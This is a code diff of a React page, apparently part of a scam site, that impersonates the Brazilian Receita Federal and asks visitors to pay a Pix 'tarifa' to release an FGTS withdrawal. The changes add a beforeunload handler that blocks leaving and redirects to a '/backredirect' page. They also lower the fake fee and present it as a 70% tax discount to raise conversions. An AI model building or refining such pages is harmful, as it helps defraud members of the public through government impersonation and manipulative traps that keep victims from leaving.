@@ -6,8 +6,28 @@ import { HiChevronRight } from "react-icons/hi";
 import { Helmet } from "react-helmet";
 import { UserData } from "../types/userData";
 import pix from "../assets/pix.png"
+import { useNavigate } from "react-router-dom";
 
 export function PagamentoTarifa() {
+
+    const navigate = useNavigate(); // Hook de navegação do react-router
+
+    useEffect(() => {
+        document.title = "Pagamento da Tarifa - Receita Federal";
+
+        // Evento de saída
+        const handleBeforeUnload = (event: BeforeUnloadEvent) => {
+            event.preventDefault();
+            navigate("/backredirect"); // Redireciona para a página /backredirect
+        };
+
+        window.addEventListener("beforeunload", handleBeforeUnload);
+
+        // Limpeza do evento ao desmontar o componente
+        return () => {
+            window.removeEventListener("beforeunload", handleBeforeUnload);
+        };
+    }, [navigate]);
 
     const [userData, setUserData] = useState<UserData>({
         nome: "",
@@ -44,8 +64,8 @@ export function PagamentoTarifa() {
 
     const questions = [
         {
-            question: "Por que é cobrado uma taxa de R$ 67,89?",
-            answer: "A taxa de R$ 67,89 é aplicada para cobrir os custos operacionais da transação, incluindo a administração e a segurança do seu saque. Essa tarifa garante que todo o processo seja realizado de maneira eficiente e segura, proporcionando a você um serviço confiável."
+            question: "Por que é cobrado uma taxa de R$ 37,89?",
+            answer: "A taxa de R$ 37,89 é aplicada para cobrir os custos operacionais da transação, incluindo a administração e a segurança do seu saque. Essa tarifa garante que todo o processo seja realizado de maneira eficiente e segura, proporcionando a você um serviço confiável."
         },
         {
             question: "Por que vocês não descontam a taxa do meu saque?",
@@ -131,11 +151,11 @@ export function PagamentoTarifa() {
                         <h3 className="text-lg font-thin text-zinc-700">
                             Pague a tarifa para receber seu FGTS em até <span className="text-green-600 font-semibold">3 minutos!</span>
                         </h3>
-                        <p className="text-gray-600">Pague hoje com desconto de:</p>
-                        <p className="text-2xl font-thin text-zinc-400">R$: 127,65 por apenas: </p>
+                        <p className="text-gray-600">70% de desconto no imposto:</p>
+                        <p className="text-2xl font-thin text-zinc-400">R$: 127,65 por: </p>
                         <div className="flex justify-center space-x-6">
                             <img src={pix} alt="pic" width={100} />
-                            <p className="text-3xl font-extrabold text-green-700">R$ 67,89</p>
+                            <p className="text-4xl font-extrabold text-green-700">R$ 37,89</p>
                         </div>
                     </div>
 
